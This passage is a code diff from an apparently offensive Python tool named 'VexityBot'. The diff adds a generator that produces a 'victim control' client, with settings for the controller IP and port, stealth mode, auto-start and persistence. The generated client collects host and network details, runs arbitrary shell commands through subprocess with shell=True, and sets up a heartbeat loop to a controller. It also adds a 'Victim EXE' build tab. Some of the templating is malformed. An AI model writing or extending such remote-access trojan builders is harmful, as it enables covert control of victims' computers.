+        info_frame = ttk.LabelFrame(bot_frame, text=f"{{bot['name']}} Information", padding=10)
+        info_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        ttk.Label(info_frame, text=f"Status: {{bot['status']}}", font=('Arial', 12, 'bold')).pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Rank: #{{bot['rank']}}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Port: {{bot['port']}}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Uptime: {{bot['uptime']}}").pack(anchor=tk.W)
+        ttk.Label(info_frame, text=f"Requests: {{bot['requests']:,}}").pack(anchor=tk.W)
+        
+        # Bot controls
+        controls_frame = ttk.LabelFrame(bot_frame, text=f"{{bot['name']}} Controls", padding=10)
+        controls_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        button_frame = ttk.Frame(controls_frame)
+        button_frame.pack(fill=tk.X)
+        
+        ttk.Button(button_frame, text="🚀 Start Bot", 
+                  command=lambda: self.start_bot(bot)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="⏹️ Stop Bot", 
+                  command=lambda: self.stop_bot(bot)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="🔄 Restart Bot", 
+                  command=lambda: self.restart_bot(bot)).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="⚙️ Configure", 
+                  command=lambda: self.configure_bot(bot)).pack(side=tk.LEFT, padx=5)
+        
+        # Bot status
+        status_frame = ttk.LabelFrame(bot_frame, text=f"{{bot['name']}} Status", padding=10)
+        status_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        self.bot_status_text = scrolledtext.ScrolledText(status_frame, height=8, font=('Consolas', 9))
+        self.bot_status_text.pack(fill=tk.BOTH, expand=True)
+        
+        # Initialize status
+        status_init = f"""
+{{bot['name']} Bot Status
+=====================
+
+Status: {{bot['status']}}
+Rank: #{{bot['rank']}}
+Port: {{bot['port']}}
+Uptime: {{bot['uptime']}}
+Requests: {{bot['requests']:,}}
+
+Ready for remote control...
+        """
+        self.bot_status_text.insert(tk.END, status_init)
+    
+    def create_control_panel(self):
+        """Create main control panel"""
+        control_frame = ttk.Frame(self.notebook)
+        self.notebook.add(control_frame, text="🎮 Control Panel")
+        
+        # System info
+        info_frame = ttk.LabelFrame(control_frame, text="System Information", padding=10)
+        info_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        self.system_info_text = scrolledtext.ScrolledText(info_frame, height=6, font=('Consolas', 9))
+        self.system_info_text.pack(fill=tk.BOTH, expand=True)
+        
+        # Update system info
+        self.update_system_info()
+        
+        # Remote commands
+        cmd_frame = ttk.LabelFrame(control_frame, text="Remote Commands", padding=10)
+        cmd_frame.pack(fill=tk.X, padx=10, pady=5)
+        
+        cmd_entry_frame = ttk.Frame(cmd_frame)
+        cmd_entry_frame.pack(fill=tk.X, pady=5)
+        
+        ttk.Label(cmd_entry_frame, text="Command:").pack(side=tk.LEFT)
+        self.cmd_entry = ttk.Entry(cmd_entry_frame, width=50)
+        self.cmd_entry.pack(side=tk.LEFT, padx=(5, 0), fill=tk.X, expand=True)
+        ttk.Button(cmd_entry_frame, text="Execute", 
+                  command=self.execute_remote_command).pack(side=tk.LEFT, padx=(5, 0))
+        
+        # Command output
+        output_frame = ttk.LabelFrame(control_frame, text="Command Output", padding=10)
+        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
+        
+        self.cmd_output_text = scrolledtext.ScrolledText(output_frame, height=10, font=('Consolas', 9))
+        self.cmd_output_text.pack(fill=tk.BOTH, expand=True)
+    
+    def update_system_info(self):
+        """Update system information display"""
+        try:
+            system_info = f"""
+System Information
+=================
+
+Hostname: {socket.gethostname()}
+OS: {platform.system()} {platform.release()}
+Architecture: {platform.architecture()[0]}
+Processor: {platform.processor()}
+Python Version: {platform.python_version()}
+
+CPU Usage: {psutil.cpu_percent()}%
+Memory Usage: {psutil.virtual_memory().percent}%
+Disk Usage: {psutil.disk_usage('/').percent}%
+
+Network Interfaces:
+"""
+            
+            for interface, addrs in psutil.net_if_addrs().items():
+                for addr in addrs:
+                    if addr.family == socket.AF_INET:
+                        system_info += f"  {interface}: {addr.address}\\n"
+            
+            self.system_info_text.delete(1.0, tk.END)
+            self.system_info_text.insert(tk.END, system_info)
+            
+        except Exception as e:
+            self.system_info_text.delete(1.0, tk.END)
+            self.system_info_text.insert(tk.END, f"Error getting system info: {{str(e)}}")
+    
+    def start_bot(self, bot):
+        """Start a bot"""
+        self.log_bot_status(bot, f"Starting {{bot['name']}}...")
+        # Simulate bot start
+        time.sleep(1)
+        self.log_bot_status(bot, f"{{bot['name']}} started successfully!")
+    
+    def stop_bot(self, bot):
+        """Stop a bot"""
+        self.log_bot_status(bot, f"Stopping {{bot['name']}}...")
+        # Simulate bot stop
+        time.sleep(1)
+        self.log_bot_status(bot, f"{{bot['name']}} stopped successfully!")
+    
+    def restart_bot(self, bot):
+        """Restart a bot"""
+        self.log_bot_status(bot, f"Restarting {{bot['name']}}...")
+        # Simulate bot restart
+        time.sleep(2)
+        self.log_bot_status(bot, f"{{bot['name']}} restarted successfully!")
+    
+    def configure_bot(self, bot):
+        """Configure a bot"""
+        messagebox.showinfo("Bot Configuration", f"Configuring {{bot['name']}}...")
+    
+    def log_bot_status(self, bot, message):
+        """Log bot status message"""
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        log_message = f"[{{timestamp}}] {{message}}\\n"
+        self.bot_status_text.insert(tk.END, log_message)
+        self.bot_status_text.see(tk.END)
+    
+    def execute_remote_command(self):
+        """Execute remote command"""
+        command = self.cmd_entry.get().strip()
+        if not command:
+            return
+        
+        self.cmd_output_text.insert(tk.END, f"Executing: {{command}}\\n")
+        self.cmd_output_text.see(tk.END)
+        
+        try:
+            # Execute command
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            
+            if result.returncode == 0:
+                self.cmd_output_text.insert(tk.END, f"Output:\\n{{result.stdout}}\\n")
+            else:
+                self.cmd_output_text.insert(tk.END, f"Error:\\n{{result.stderr}}\\n")
+        except subprocess.TimeoutExpired:
+            self.cmd_output_text.insert(tk.END, "Command timed out\\n")
+        except Exception as e:
+            self.cmd_output_text.insert(tk.END, f"Error: {{str(e)}}\\n")
+        
+        self.cmd_output_text.see(tk.END)
+        self.cmd_entry.delete(0, tk.END)
+    
+    def start_communication(self):
+        """Start communication with controller"""
+        def communication_thread():
+            while True:
+                try:
+                    # Send heartbeat to controller
+                    self.send_heartbeat()
+                    time.sleep(30)  # Send heartbeat every 30 seconds
+                except Exception as e:
+                    print(f"Communication error: {{e}}")
+                    time.sleep(60)  # Wait longer on error
+        
+        thread = threading.Thread(target=communication_thread, daemon=True)
+        thread.start()
+    
+    def send_heartbeat(self):
+        """Send heartbeat to controller"""
+        try:
+            data = {{
+                "type": "heartbeat",
+                "hostname": socket.gethostname(),
+                "timestamp": datetime.now().isoformat(),
+                "bots": len(self.selected_bots)
+            }}
+            
+            # In a real implementation, you'd send this to the controller
+            print("Heartbeat sent: {data}")
+        except Exception as e:
+            print("Heartbeat error: {e}")
+
+if __name__ == "__main__":
+    victim_control = VexityBotVictimControl()
+'''.format(
+            controller_ip=controller_ip,
+            controller_port=controller_port,
+            stealth_mode=stealth_mode,
+            auto_start=auto_start,
+            persistence=persistence,
+            selected_bots=selected_bots
+        )
+        
+        return victim_content
+    
+    def generate_bot_panel_code(self, bot):
+        """Generate bot panel code for a specific bot"""
+        return f"""
+    def create_{bot['name'].lower()}_panel(self):
+        \"\"\"Create {bot['name']} panel\"\"\"
+        # Bot-specific panel implementation
+        pass
+"""
+    
+    def open_victim_output_folder(self):
+        """Open victim output folder"""
+        try:
+            import subprocess
+            import platform
+            
+            if platform.system() == "Windows":
+                subprocess.run(["explorer", "dist"], check=True)
+            else:
+                subprocess.run(["open", "dist"], check=True)
+                
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to open output folder: {{str(e)}}")
+    
     def create_steganography_tab(self):
         """Create the Steganography tab"""
         stego_frame = ttk.Frame(self.notebook)
@@ -5376,6 +6695,15 @@ if __name__ == "__main__":
                 self.notebook.select(i)
                 break
         self.update_status("Create EXE tab opened")
+    
+    def open_victim_exe(self):
+        """Open the Victim EXE tab"""
+        # Find the Victim EXE tab and select it
+        for i in range(self.notebook.index("end")):
+            if self.notebook.tab(i, "text") == "🎯 Victim EXE":
+                self.notebook.select(i)
+                break
+        self.update_status("Victim EXE tab opened")
     
     def open_steganography(self):
         """Open the Steganography tab"""
